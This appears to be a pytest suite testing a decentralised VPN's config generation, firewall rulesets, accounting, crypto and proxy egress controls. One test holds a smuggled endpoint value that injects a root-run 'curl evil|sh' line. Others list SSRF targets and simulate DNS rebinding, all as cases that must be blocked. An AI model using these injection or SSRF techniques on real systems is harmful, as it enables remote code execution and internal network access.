"""
Fast, hermetic unit tests for the dVPN pure-logic modules (no root, no network, no nft/wg).
Covers: config rendering, two-sided accounting/reconciliation, the isolation guard's render-only
invariants, the nftables ruleset SAFETY invariants, cross-language ML-DSA crypto, and a HONESTY
lint that the user-facing CLI/registry copy never overclaims (no "protected"/"anonymous"/on-chain
"paid" language, IOU framing preserved).
"""

from __future__ import annotations

import pathlib

import pytest

from animica.vpn import (
    KILLSWITCH_TABLE,
    NFT_TABLE,
    WG_SUBNET,
    accounting,
    config_gen,
    crypto,
    nftables,
)

# --------------------------------------------------------------------- config_gen


# Realistic base64 Curve25519-shaped keys so config_gen's anti-injection validation accepts them.
_K1 = "QOySt+7wPZ3sQ0aVJ2xkq6r8m1n0uY9cZ4eB2hLdWk8="
_K2 = "aB3dEf6hJ9kLmN0pQr2sT4uV6wX8yZ1cE3gI5kM7oQ0="
_K3 = "Zx1Cv2Bn3Mm4As5Df6Gh7Jk8Ll9Qw0Er1Ty2Ui3Op4="


def test_client_conf_full_tunnel_forces_dns():
    c = config_gen.ClientConf(
        private_key=_K1, address="10.99.0.7/32", exit_pubkey=_K2,
        exit_endpoint="203.0.113.9:51820",
    )
    conf = config_gen.render_client_conf(c)
    assert "[Interface]" in conf and "[Peer]" in conf
    assert "AllowedIPs = 0.0.0.0/0" in conf          # full tunnel by default
    assert "DNS = 1.1.1.1" in conf                    # DNS forced through the tunnel (no leak)
    assert "Endpoint = 203.0.113.9:51820" in conf
    assert "PersistentKeepalive = 25" in conf


def test_client_conf_split_tunnel_and_no_dns():
    c = config_gen.ClientConf(
        private_key=_K1, address="10.99.0.8/32", exit_pubkey=_K2,
        exit_endpoint="h.example:51820", allowed_ips="10.8.0.0/24, 192.0.2.0/24", dns=None,
    )
    conf = config_gen.render_client_conf(c)
    assert "AllowedIPs = 10.8.0.0/24, 192.0.2.0/24" in conf
    assert "DNS" not in conf


def test_client_conf_rejects_postup_injection_via_endpoint():
    """A registry-controlled endpoint with a newline must not be able to inject a
    root-executed PostUp line into the wg-quick conf."""
    c = config_gen.ClientConf(
        private_key=_K1, address="10.99.0.7/32", exit_pubkey=_K2,
        exit_endpoint="203.0.113.9:51820\nPostUp = curl evil|sh",
    )
    with pytest.raises(config_gen.ConfigInjectionError):
        config_gen.render_client_conf(c)


def test_exit_conf_lists_every_peer():
    e = config_gen.ExitConf(private_key=_K1, peers=[(_K2, "10.99.0.2/32"), (_K3, "10.99.0.3/32")])
    conf = config_gen.render_exit_conf(e)
    assert conf.count("[Peer]") == 2
    assert f"PublicKey = {_K2}" in conf and "AllowedIPs = 10.99.0.3/32" in conf
    assert "ListenPort = " in conf


# --------------------------------------------------------------------- accounting


def test_usage_meter_monotonic_and_rebase_on_reset():
    # A per-session meter starts from a fresh wg interface at 0, so the first sample counts
    # from zero (matches WireGuard counter semantics at session start).
    m = accounting.UsageMeter(session_id="s1", side="exit")
    m.observe(100, 200, ts=1)              # from 0 -> cum (100, 200)
    s2 = m.observe(300, 500, ts=2)         # +200 rx, +300 tx
    assert (s2.cum_rx, s2.cum_tx) == (300, 500)
    # counter RESET (interface recreated) must not produce a negative delta
    s3 = m.observe(10, 10, ts=3)
    assert (s3.cum_rx, s3.cum_tx) == (300, 500)   # unchanged; rebased to a new baseline
    s4 = m.observe(60, 40, ts=4)           # +50 rx, +30 tx from the new baseline
    assert (s4.cum_rx, s4.cum_tx) == (350, 530)


def test_reconcile_takes_min_and_caps_at_capacity():
    # client says 1000, exit says 900 -> reward on the min, both under capacity
    reconciled, flagged = accounting.reconcile(1000, 900, capacity_bytes=10_000)
    assert reconciled == 900
    # >10% divergence is flagged
    _, flagged2 = accounting.reconcile(1000, 500, capacity_bytes=10_000)
    assert flagged2 is True
    # capacity cap dominates an inflated claim
    reconciled3, _ = accounting.reconcile(10**12, 10**12, capacity_bytes=5_000)
    assert reconciled3 == 5_000
    # negatives are floored to zero
    reconciled4, _ = accounting.reconcile(-5, 100, capacity_bytes=10_000)
    assert reconciled4 == 0


def test_signed_report_roundtrips_and_is_bound_to_payload():
    w = crypto.Wallet.generate()
    m = accounting.UsageMeter(session_id="sess-xyz", side="client")
    sample = m.observe(4096, 8192, ts=1700000000)
    rep = m.signed_report(w, sample)
    # the signed message is exactly the canonical string the marketplace re-derives
    assert rep["reportMsg"] == accounting.canonical_report_message(rep)
    assert crypto.verify(bytes.fromhex(rep["publicKey"]),
                         (crypto.SIGN_DOMAIN + rep["reportMsg"]).encode(),
                         bytes.fromhex(rep["sig"])) is True
    # tampering with a counter breaks verification
    tampered = accounting.canonical_report_message({**rep, "cumRx": rep["cumRx"] + 1})
    assert crypto.verify(bytes.fromhex(rep["publicKey"]),
                         (crypto.SIGN_DOMAIN + tampered).encode(),
                         bytes.fromhex(rep["sig"])) is False


# --------------------------------------------------------------------- nftables SAFETY


def test_exit_ruleset_is_isolated_and_never_destructive():
    rs = nftables.render_exit_ruleset("eth0", "anmwg0")
    assert f"table inet {NFT_TABLE}" in rs
    # SAFETY: never flush, never flip a base-chain policy to drop, never touch docker chains
    assert "flush" not in rs
    assert "policy drop" not in rs          # exit chains are policy accept (only ADD drops)
    assert "DOCKER" not in rs
    # every drop is scoped to the tunnel iface / subnet, so host/docker traffic is untouched
    for line in rs.splitlines():
        if line.strip().endswith("drop"):
            assert 'iifname "anmwg0"' in line, f"unscoped drop: {line!r}"
    # the egress ACL blocks LAN + cloud metadata + BitTorrent + SMTP
    assert "169.254.0.0/16" in rs and "10.0.0.0/8" in rs
    assert "6881-6889" in rs and "25" in rs
    # scoped NAT only for the tunnel subnet out the uplink
    assert f"ip saddr {WG_SUBNET} oifname \"eth0\" masquerade" in rs


def test_killswitch_is_fail_closed():
    ks = nftables.render_killswitch_ruleset("anmwg0", "203.0.113.9", 51820)
    assert f"table inet {KILLSWITCH_TABLE}" in ks
    assert "policy drop" in ks               # fail-closed: default drop
    assert 'oifname "anmwg0" accept' in ks   # only the tunnel + loopback + the handshake escape
    assert 'oifname "lo" accept' in ks
    assert "ip daddr 203.0.113.9 udp dport 51820 accept" in ks


def test_killswitch_ct_accept_is_scoped_to_exit_not_global():
    # An unqualified `ct state established,related accept` would keep leaking pre-existing
    # cleartext flows out the uplink after the tunnel drops. It must be bound to the exit IP.
    ks = nftables.render_killswitch_ruleset("anmwg0", "203.0.113.9", 51820)
    for line in ks.splitlines():
        s = line.strip()
        if s.endswith("ct state established,related accept"):
            assert s.startswith("ip daddr 203.0.113.9"), f"unscoped ct-accept leaks: {s!r}"


def test_exit_input_chain_shields_host_services_from_tunnel():
    rs = nftables.render_exit_ruleset("eth0", "anmwg0")
    assert "chain input" in rs                       # the exit host itself must be protected
    assert 'iifname "anmwg0" drop' in rs             # default-drop new tunnel->host connections
    assert 'iifname "anmwg0" meta nfproto ipv6 drop' in rs


def test_extra_block_v4_is_appended():
    rs = nftables.render_exit_ruleset("eth0", "anmwg0", extra_block_v4=["198.51.100.0/24"])
    assert "198.51.100.0/24" in rs


def test_split_tunnel_routes_forced_dns_through_the_tunnel():
    # DNS forced to 1.1.1.1 while split-tunnelling would leak every query to the LAN/ISP
    # resolver unless the resolver itself is routed into the tunnel.
    c = config_gen.ClientConf(
        private_key=_K1, address="10.99.0.7/32", exit_pubkey=_K2,
        exit_endpoint="203.0.113.9:51820", allowed_ips="10.8.0.0/24", dns="1.1.1.1",
    )
    conf = config_gen.render_client_conf(c)
    assert "1.1.1.1/32" in conf, "forced resolver must be routed through the tunnel (no DNS leak)"


def test_guard_fails_closed_when_verification_tools_missing(monkeypatch):
    from animica.vpn import guard
    monkeypatch.setattr(guard.shutil, "which", lambda _name: None)  # ss/nft/ps all absent
    rep = guard.preflight(port=51820, allow_validator=False)
    assert not rep.ok, "missing tools = uncertainty = refuse (must never silently pass)"
    assert any("cannot verify" in r or "cannot determine" in r for r in rep.reasons)


# --------------------------------------------------------------------- crypto interop


def test_address_derives_and_signature_verifies():
    w = crypto.Wallet.generate()
    assert w.address.startswith("anim1")
    sig = w.sign_login("challenge-123")
    assert crypto.verify(bytes.fromhex(w.public_key_hex), (crypto.SIGN_DOMAIN + "challenge-123").encode(),
                         bytes.fromhex(sig)) is True
    # wrong challenge fails
    assert crypto.verify(bytes.fromhex(w.public_key_hex), (crypto.SIGN_DOMAIN + "other").encode(),
                         bytes.fromhex(sig)) is False


# --------------------------------------------------------------------- HONESTY lint

_VPN_DIR = pathlib.Path(__file__).resolve().parent.parent


def test_cli_copy_never_overclaims():
    """The CLI must keep honest framing and never POSITIVELY claim rewards were paid on-chain."""
    cli = (_VPN_DIR.parent / "cli" / "vpn.py").read_text()
    low = cli.lower()
    # honest framing present
    assert "not tor" in low
    assert "iou" in low
    assert "deferred" in low
    # unambiguous positive overclaims must be absent (honest NEGATIONS like
    # "nothing is paid on-chain" / "not yet a spendable balance" are fine and expected).
    for bad in ("successfully paid", "now spendable", "added to your balance",
                "reward credited to", "settlement complete", "funds sent to your wallet"):
        assert bad not in low, f"overclaiming phrase in cli/vpn.py: {bad!r}"
    # any mention of 'spendable' must be negated
    if "spendable" in low:
        assert "not yet a spendable" in low or "not a spendable" in low


def test_doctor_gates_the_connected_claim():
    doc = (_VPN_DIR / "doctor.py").read_text().lower()
    # the leak self-test must be able to say a tunnel is NOT verified
    assert "not verified" in (_VPN_DIR.parent / "cli" / "vpn.py").read_text().lower()
    assert "healthy" in doc


# --------------------------------------------------------------------- http_proxy egress ACL
# These lock in the egress invariants that keep an exit relay from being turned into an SSRF
# pivot into its operator's LAN / loopback / cloud-metadata. The DNS-rebind case is a
# regression guard for a confirmed, exploitable TOCTOU (resolve-then-reconnect) that was fixed
# by resolving once and pinning the validated IP.

def test_proxy_blocks_loopback_and_reserved_literals():
    from animica.vpn import http_proxy as hp
    for host, port in [("127.0.0.1", 8080), ("::1", 8080), ("10.0.0.5", 80),
                       ("169.254.169.254", 80), ("::ffff:127.0.0.1", 80),
                       ("2002:7f00:0001::1", 80)]:
        cands, err = hp._resolve_safe(host, port)
        assert cands is None and err, f"{host} should be blocked, got {cands!r}/{err!r}"


def test_proxy_blocks_abuse_ports_even_for_public_ip():
    from animica.vpn import http_proxy as hp
    for port in (25, 465, 587, 445, 3389, 6881, 6889):
        cands, err = hp._resolve_safe("93.184.216.34", port)
        assert cands is None and "port" in (err or ""), f"port {port} should be blocked"


def test_proxy_dns_rebind_pins_validated_ip(monkeypatch):
    """1st resolution public, 2nd loopback: the ACL must pin to the public IP resolved at
    check time and MUST NOT re-resolve to the loopback at connect time."""
    import socket as _s
    from animica.vpn import http_proxy as hp
    calls = {"n": 0}

    def rebinding_gai(host, port, *a, **kw):
        if host == "rebind.invalid":
            calls["n"] += 1
            ip = "93.184.216.34" if calls["n"] == 1 else "127.0.0.1"
            return [(_s.AF_INET, _s.SOCK_STREAM, _s.IPPROTO_TCP, "", (ip, port))]
        raise _s.gaierror("no such host")

    monkeypatch.setattr(_s, "getaddrinfo", rebinding_gai)
    cands, err = hp._resolve_safe("rebind.invalid", 80)
    assert err is None and cands, "public resolution should validate"
    # every candidate is a validated IP literal (not the hostname) -> connect can't re-resolve
    assert cands[0][1][0] == "93.184.216.34"
    assert calls["n"] == 1, "must resolve exactly once"


def test_proxy_token_compare_is_constant_time():
    src = (_VPN_DIR / "http_proxy.py").read_text()
    assert "hmac.compare_digest" in src, "token comparison must be constant-time"
    assert "close_connection = True" in src, "rejections must close the connection (anti-smuggling)"


# --------------------------------------------------------------- macOS (pf) parity 9.0.7
# The Darwin firewall backend must enforce the SAME security policy as the nft ruleset:
# scoped NAT, BCP38 anti-spoof, no v6 exit, block RFC1918/metadata/CGNAT/host + abuse ports,
# and a fail-closed killswitch. These lock in parity so the macOS exit is never weaker.


def test_pf_exit_anchor_has_parity_with_nft_ruleset():
    from animica.vpn import pf
    rs = pf.render_exit_anchor("en0", "anmwg0")
    # scoped NAT for the tunnel subnet only, out the uplink
    assert f"nat on en0 inet from {WG_SUBNET} to any -> (en0)" in rs
    # BCP38 anti-spoof + no IPv6 exit
    assert f'block drop in quick on anmwg0 inet from ! {WG_SUBNET} to any' in rs
    assert "block drop in quick on anmwg0 inet6 all" in rs
    # same blocked destinations + abuse ports as nft (SSRF/LAN/metadata/CGNAT, SMTP, torrents)
    assert "169.254.0.0/16" in rs and "10.0.0.0/8" in rs and "100.64.0.0/10" in rs
    assert "6881:6889" in rs and "25" in rs
    # host-service protection: tunnel may not reach ANY address on the exit host (pf `self`)
    assert f"block drop in quick on anmwg0 inet from {WG_SUBNET} to self" in rs
    # every block is scoped to the tunnel iface (never the host's own traffic)
    for line in rs.splitlines():
        if line.strip().startswith("block drop"):
            assert 'on anmwg0' in line, f"unscoped pf block: {line!r}"
    # never destructive to the host's ruleset
    assert "flush" not in rs.lower()


def test_pf_main_ruleset_section_order_is_valid():
    from animica.vpn import pf
    # Exit + killswitch both active, with the stock com.apple anchors present.
    main = pf.build_main_ruleset(exit_active=True, killswitch_active=True, apple_anchors=True)
    lines = [ln.strip() for ln in main.splitlines() if ln.strip()]
    # pf mandatory order: normalization(scrub) < translation(nat) < queueing(dummynet) < filtering(anchor)
    def idx(exact):
        return next(i for i, ln in enumerate(lines) if ln == exact)
    assert idx('scrub-anchor "com.apple/*"') < idx('nat-anchor "com.apple/*"')
    assert idx('nat-anchor "com.apple/*"') < idx('dummynet-anchor "com.apple/*"')
    # our nat-anchor sits in the translation section (after com.apple nat, before dummynet)
    assert idx('nat-anchor "com.apple/*"') < idx(f'nat-anchor "{NFT_TABLE}"') < idx('dummynet-anchor "com.apple/*"')
    # our FILTER anchors come BEFORE com.apple's so their `quick` rules win (no host rule preempts)
    assert idx(f'anchor "{NFT_TABLE}"') < idx('anchor "com.apple/*"')
    assert idx(f'anchor "{KILLSWITCH_TABLE}"') < idx('anchor "com.apple/*"')
    # dummynet (queueing) precedes all filter anchors
    assert idx('dummynet-anchor "com.apple/*"') < idx(f'anchor "{NFT_TABLE}"')


def test_pf_main_ruleset_without_apple_anchors_is_minimal():
    from animica.vpn import pf
    main = pf.build_main_ruleset(exit_active=False, killswitch_active=True, apple_anchors=False)
    assert 'com.apple' not in main
    assert f'anchor "{KILLSWITCH_TABLE}"' in main
    assert f'nat-anchor "{NFT_TABLE}"' not in main  # exit not active


def test_pf_exit_anchor_blocks_exactly_the_nft_ports():
    from animica.vpn import pf
    from animica.vpn.nftables import BLOCKED_TCP_PORTS, BLOCKED_UDP_PORTS
    rs = pf.render_exit_anchor("en0", "anmwg0")
    for p in BLOCKED_TCP_PORTS:
        assert str(p) in rs, f"pf exit anchor missing blocked TCP port {p}"
    for p in BLOCKED_UDP_PORTS:
        assert str(p) in rs, f"pf exit anchor missing blocked UDP port {p}"


def test_pf_killswitch_anchor_is_fail_closed():
    from animica.vpn import pf
    ks = pf.render_killswitch_anchor("anmwg0", "203.0.113.9", 51820)
    # default-drop everything out, allow only lo, the tunnel iface, and the handshake escape
    assert "block drop out quick inet from any to any" in ks
    assert "block drop out quick inet6 from any to any" in ks
    assert "pass out quick on lo0 all" in ks
    assert "pass out quick on anmwg0 all" in ks
    # the only outbound-to-a-destination pass is pinned to the exit endpoint (no blanket escape)
    assert "to 203.0.113.9 port 51820" in ks
    assert "to any port" not in ks


def test_pf_extra_block_v4_is_appended():
    from animica.vpn import pf
    rs = pf.render_exit_anchor("en0", "anmwg0", extra_block_v4=["198.51.100.0/24"])
    assert "198.51.100.0/24" in rs


# ------------------------------------------------------------- platform_net dispatch 9.0.7


def test_detect_uplink_parses_linux_and_darwin(monkeypatch):
    from animica.vpn import platform_net as pnet

    class _CP:
        def __init__(self, out): self.stdout = out

    # Linux: `ip route show default`
    monkeypatch.setattr(pnet, "IS_DARWIN", False)
    monkeypatch.setattr(pnet.subprocess, "run",
                        lambda *a, **k: _CP("default via 192.168.1.1 dev eth0 proto dhcp\n"))
    assert pnet.detect_uplink() == "eth0"

    # Darwin: `route -n get default`
    monkeypatch.setattr(pnet, "IS_DARWIN", True)
    monkeypatch.setattr(pnet.subprocess, "run",
                        lambda *a, **k: _CP("   route to: default\n  interface: en1\n"))
    assert pnet.detect_uplink() == "en1"


def test_read_ip_forward_darwin_uses_bsd_sysctl(monkeypatch):
    from animica.vpn import platform_net as pnet

    class _CP:
        def __init__(self, out): self.stdout = out

    seen = {}

    def fake_run(cmd, *a, **k):
        seen["cmd"] = cmd
        return _CP("1\n")

    monkeypatch.setattr(pnet, "IS_DARWIN", True)
    monkeypatch.setattr(pnet.subprocess, "run", fake_run)
    assert pnet.read_ip_forward() == "1"
    assert seen["cmd"] == ["sysctl", "-n", "net.inet.ip.forwarding"]


# ------------------------------------------------------------- payout address 9.0.7


def test_exit_descriptor_includes_payout_address_and_defaults_to_wallet():
    from animica.vpn.exit_daemon import ExitConfig, ExitDaemon

    w = crypto.Wallet.generate()
    d = ExitDaemon(w, ExitConfig(), reg=object())  # reg unused until register()
    d.public_ip = "203.0.113.9"
    d.wg_pub = _K2

    captured = {}

    class _Reg:
        def register_exit(self, descriptor, *, idem=None):
            captured["descriptor"] = descriptor
            captured["idem"] = idem
            # REAL marketplace shape: {exit:{id,…}, registered, note} — not a flat id.
            return {"exit": {"id": "exit-abc"}, "registered": True}

    d.reg = _Reg()
    exit_id = d.register()
    assert exit_id == "exit-abc", "must read the nested exit.id the marketplace returns"
    assert captured["descriptor"]["payoutAddress"] == w.address, "defaults to operator wallet"
    # idempotency key binds to the descriptor content (so a changed payout re-runs the handler)
    assert captured["idem"].startswith(f"exit-register:{_K2}:")


def test_exit_descriptor_uses_explicit_payout_and_changes_idem(monkeypatch):
    from animica.vpn.exit_daemon import ExitConfig, ExitDaemon

    w = crypto.Wallet.generate()
    other = crypto.Wallet.generate().address

    idems = []

    class _Reg:
        def register_exit(self, descriptor, *, idem=None):
            idems.append((descriptor.get("payoutAddress"), idem))
            return {"id": "exit-abc"}

    def _make(addr):
        d = ExitDaemon(w, ExitConfig(payout_address=addr), reg=_Reg())
        d.public_ip = "203.0.113.9"
        d.wg_pub = _K2
        d.register()

    _make("")            # default -> wallet
    _make(other)         # explicit different address
    assert idems[0][0] == w.address and idems[1][0] == other
    assert idems[0][1] != idems[1][1], "different payout address must mint a different idem key"


def test_cli_validates_anm_payout_address():
    from animica.cli.vpn import _validate_anm_address

    good = crypto.Wallet.generate().address
    assert _validate_anm_address(good) is True
    assert _validate_anm_address("not-an-address") is False
    assert _validate_anm_address("bc1qxyz") is False           # wrong hrp
    assert _validate_anm_address(good[:-1] + ("q" if good[-1] != "q" else "p")) is False  # bad checksum


def test_cli_exit_serve_exposes_address_flag():
    # the operator-facing payout flag must exist and be documented honestly
    cli = (_VPN_DIR.parent / "cli" / "vpn.py").read_text()
    assert '"--address"' in cli
    low = cli.lower()
    assert "iou" in low and ("settle" in low or "deferred" in low)


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
